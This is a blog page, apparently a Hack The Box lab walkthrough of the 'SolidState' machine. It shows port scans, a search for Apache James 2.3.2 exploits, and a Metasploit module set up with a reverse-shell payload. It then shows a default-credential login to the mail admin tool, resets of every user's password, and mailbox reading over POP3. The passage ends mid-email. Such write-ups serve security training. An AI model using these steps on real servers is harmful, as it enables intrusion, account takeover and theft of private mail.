@@ -1,0 +1,675 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CrazyInSide">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657CrazyInSide:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.51[sud">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - SolidState">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-SolidState.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657CrazyInSide:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.51[sud">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/SolidState.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830144035803.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.044Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.055Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/SolidState.png">
+  
+  
+  
+  <title>HTB Walkthrough - SolidState - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - SolidState"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          100 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - SolidState</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/SolidState.png" srcset="/img/loading.gif" lazyload alt="SolidState"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.51</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-30 06:04:41 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 4555/tcp on 10.10.10.51                                   </span><br><span class="line">Discovered open port 22/tcp on 10.10.10.51                                     </span><br><span class="line">Discovered open port 110/tcp on 10.10.10.51                                    </span><br><span class="line">Discovered open port 25/tcp on 10.10.10.51                                     </span><br><span class="line">Discovered open port 119/tcp on 10.10.10.51                                    </span><br><span class="line">Discovered open port 80/tcp on 10.10.10.51     </span><br><span class="line">CrazyInSide:~/HackTheBox$ <span class="built_in">cat</span> SolidState </span><br><span class="line"><span class="comment"># Nmap 7.92SVN scan initiated Tue Aug 30 14:08:28 2022 as: nmap -sC -sV -p4555,22,110,25,119,80 -oN SolidState 10.10.10.51</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.51</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)</span><br><span class="line">|   256 78b83af660190691f553921d3f48ed53 (ECDSA)</span><br><span class="line">|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)</span><br><span class="line">25/tcp   open  smtp    JAMES smtpd 2.3.2</span><br><span class="line">|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.4 [10.10.16.4])</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-title: Home - Solid State Security</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">110/tcp  open  pop3    JAMES pop3d 2.3.2</span><br><span class="line">|_tls-alpn: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-cert: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">119/tcp  open  nntp    JAMES nntpd (posting ok)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-cert: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-alpn: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">4555/tcp open  rsip?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     JAMES Remote Administration Tool 2.3.2</span><br><span class="line">|     Please enter your login and password</span><br><span class="line">|     Login <span class="built_in">id</span>:</span><br><span class="line">|     Password:</span><br><span class="line">|     Login failed <span class="keyword">for</span> </span><br><span class="line">|_    Login <span class="built_in">id</span>:</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://ParrotOS.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port4555-TCP:V=7.92SVN%I=7%D=8/30%Time=630DA969%P=x86_64-unknown-linux-</span><br><span class="line">SF:gnu%r(GenericLines,7C,<span class="string">&quot;JAMES\x20Remote\x20Administration\x20Tool\x202\.</span></span><br><span class="line"><span class="string">SF:3\.2\nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:</span></span><br><span class="line"><span class="string">SF:\nPassword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n&quot;</span>);</span><br><span class="line">Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Tue Aug 30 14:12:35 2022 -- 1 IP address (1 host up) scanned in 246.92 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>25端口运行的这个应用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ searchsploit JAMES            </span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                                        |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Apache James Server 2.2 - SMTP Denial of Service                                                      | multiple/dos/27915.pl</span><br><span class="line">Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                  | linux/remote/48130.rb</span><br><span class="line">Apache James Server 2.3.2 - Remote Command Execution                                                  | linux/remote/35513.py</span><br><span class="line">Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                        | linux/remote/50347.py</span><br><span class="line">WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow                                   | windows/remote/944.c</span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Paper Title                                                                                          |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Exploiting Apache James Server 2.3.2                                                                  | docs/english/40123-exploiting-ap</span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search Apache James</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/linux/smtp/apache_james_exec      2015-10-01       normal  Yes    Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write</span><br><span class="line">   1  auxiliary/scanner/http/log4shell_scanner  2021-12-09       normal  No     Log4Shell HTTP Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/log4shell_scanner</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 0</span><br><span class="line">[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(linux/smtp/apache_james_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/smtp/apache_james_exec):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   ADMINPORT  4555             <span class="built_in">yes</span>       Port <span class="keyword">for</span> James remote administration tool</span><br><span class="line">   PASSWORD   root             <span class="built_in">yes</span>       Root password <span class="keyword">for</span> James remote administration tool</span><br><span class="line">   POP3PORT   110              no        Port <span class="keyword">for</span> POP3 Apache James Service</span><br><span class="line">   RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT      25               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SRVHOST    0.0.0.0          <span class="built_in">yes</span>       The <span class="built_in">local</span> host or network interface to listen on. This must be an address on the <span class="built_in">local</span> machin</span><br><span class="line">                                         e or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT    8080             <span class="built_in">yes</span>       The <span class="built_in">local</span> port to listen on.</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                     no        The URI to use <span class="keyword">for</span> this exploit (default is random)</span><br><span class="line">   USERNAME   root             <span class="built_in">yes</span>       Root username <span class="keyword">for</span> James remote administration tool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.3      <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   1   Cron</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/smtp/apache_james_exec) &gt; </span><br></pre></td></tr></table></figure>
+
+<p>端口号这些是都对得上的，但是用户名与密码或许不可以。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(linux/smtp/apache_james_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.4:4444 </span><br><span class="line">[*] 10.10.10.51:25 - Command Stager progress - 100.00% <span class="keyword">done</span> (833/833 bytes)</span><br><span class="line">[*] 10.10.10.51:25 - Waiting <span class="keyword">for</span> cron to execute payload...</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(linux/smtp/apache_james_exec) &gt; </span><br></pre></td></tr></table></figure>
+
+<p>确实不行。</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830144035803.png" srcset="/img/loading.gif" lazyload alt="image-20220830144035803"></p>
+<p>4555端口浏览器访问把我浏览器里一些HTTP头自动当成输入数据提交了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ nc 10.10.10.51 4555     </span><br><span class="line">JAMES Remote Administration Tool 2.3.2</span><br><span class="line">Please enter your login and password</span><br><span class="line">Login <span class="built_in">id</span>:</span><br><span class="line">root</span><br><span class="line">Password:</span><br><span class="line">root</span><br><span class="line">Welcome root. HELP <span class="keyword">for</span> a list of commands</span><br><span class="line"><span class="built_in">help</span></span><br><span class="line">Currently implemented commands:</span><br><span class="line"><span class="built_in">help</span>                                    display this <span class="built_in">help</span></span><br><span class="line">listusers                               display existing accounts</span><br><span class="line">countusers                              display the number of existing accounts</span><br><span class="line">adduser [username] [password]           add a new user</span><br><span class="line">verify [username]                       verify <span class="keyword">if</span> specified user exist</span><br><span class="line">deluser [username]                      delete existing user</span><br><span class="line">setpassword [username] [password]       sets a user<span class="string">&#x27;s password</span></span><br><span class="line"><span class="string">setalias [user] [alias]                 locally forwards all email for &#x27;</span>user<span class="string">&#x27; to &#x27;</span><span class="built_in">alias</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">showalias [username]                    shows a user&#x27;</span>s current email <span class="built_in">alias</span></span><br><span class="line">unsetalias [user]                       unsets an <span class="built_in">alias</span> <span class="keyword">for</span> <span class="string">&#x27;user&#x27;</span></span><br><span class="line">setforwarding [username] [emailaddress] forwards a user<span class="string">&#x27;s email to another email address</span></span><br><span class="line"><span class="string">showforwarding [username]               shows a user&#x27;</span>s current email forwarding</span><br><span class="line">unsetforwarding [username]              removes a forward</span><br><span class="line">user [repositoryname]                   change to another user repository</span><br><span class="line">shutdown                                kills the current JVM (convenient when James is run as a daemon)</span><br><span class="line">quit                                    close connection</span><br></pre></td></tr></table></figure>
+
+<p>root:root明明可以的啊，为啥不成功呢。我可以遍历用户名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">listusers</span><br><span class="line">Existing accounts 6</span><br><span class="line">user: james</span><br><span class="line">user: ../../../../../../../../etc/bash_completion.d</span><br><span class="line">user: thomas</span><br><span class="line">user: john</span><br><span class="line">user: mindy</span><br><span class="line">user: mailadmin</span><br></pre></td></tr></table></figure>
+
+<p>把密码都改了，第二个用户名为什么是一个路径我也不知道：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">setpassword james crazyinside</span><br><span class="line">Password <span class="keyword">for</span> james reset</span><br><span class="line">setpassword thomas crazyinside</span><br><span class="line">Password <span class="keyword">for</span> thomas reset</span><br><span class="line">setpassword john crazyinside</span><br><span class="line">Password <span class="keyword">for</span> john reset</span><br><span class="line">setpassword mindy crazyinside</span><br><span class="line">Password <span class="keyword">for</span> mindy reset</span><br><span class="line">setpassword mailadmin crazyinside</span><br><span class="line">Password <span class="keyword">for</span> mailadmin reset</span><br></pre></td></tr></table></figure>
+
+<p>在mindy邮箱里有两封邮件，其中一封包含一个用户名口令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ telnet 10.10.10.51 110</span><br><span class="line">Trying 10.10.10.51...</span><br><span class="line">Connected to 10.10.10.51.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready </span><br><span class="line">USER mindy</span><br><span class="line">+OK</span><br><span class="line">PASS crazyinside</span><br><span class="line">+OK Welcome mindy</span><br><span class="line">LIST</span><br><span class="line">+OK 2 1945</span><br><span class="line">1 1109</span><br><span class="line">2 836</span><br><span class="line">.</span><br><span class="line">RETR 1</span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: &lt;mailadmin@localhost&gt;</span><br><span class="line">Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: mindy@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798</span><br><span class="line">          <span class="keyword">for</span> &lt;mindy@localhost&gt;;</span><br><span class="line">          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: Welcome</span><br><span class="line"></span><br><span class="line">Dear Mindy,</span><br><span class="line">Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical <span class="keyword">in</span> fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will <span class="built_in">help</span> you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.</span><br><span class="line"></span><br><span class="line">We are looking forward to you joining our team and your success at Solid State Security. </span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line">.</span><br><span class="line">RETR 2</span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: &lt;mailadmin@localhost&gt;</span><br><span class="line">Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: mindy@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581</span><br><span class="line">          <span class="keyword">for</span> &lt;mindy@localhost&gt;;</span><br><span class="line">          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: Your Access</span><br><span class="line"></span><br><span class="line">Dear Mindy,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Here are your ssh credentials to access the system. 